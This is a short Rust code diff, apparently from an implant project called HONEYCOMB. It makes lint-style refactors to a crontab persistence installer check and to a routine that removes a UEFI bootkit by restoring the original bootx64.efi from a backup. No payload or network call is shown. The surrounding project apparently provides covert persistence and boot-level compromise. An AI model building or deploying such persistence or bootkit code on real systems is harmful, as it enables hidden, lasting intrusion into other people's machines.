@@ -39,7 +39,7 @@ fn install_crontab() -> bool {
         Err(_) => String::new(),
     };
 
-    if current.contains(&cron_entry.trim()) {
+    if current.contains(cron_entry.trim()) {
         info!("Crontab persistence already installed");
         return true;
     }
@@ -260,13 +260,12 @@ pub fn remove_uefi_bootkit() -> bool {
             let backup = target.join("bootx64.efi.hive_bak");
             let original = target.join("bootx64.efi");
 
-            if backup.exists() {
-                if std::fs::copy(&backup, &original).is_ok() {
+            if backup.exists()
+                && std::fs::copy(&backup, &original).is_ok() {
                     let _ = std::fs::remove_file(&backup);
                     info!("HONEYCOMB: UEFI bootkit removed, original restored");
                     return true;
                 }
-            }
         }
     }
     warn!("HONEYCOMB: no bootkit found to remove");
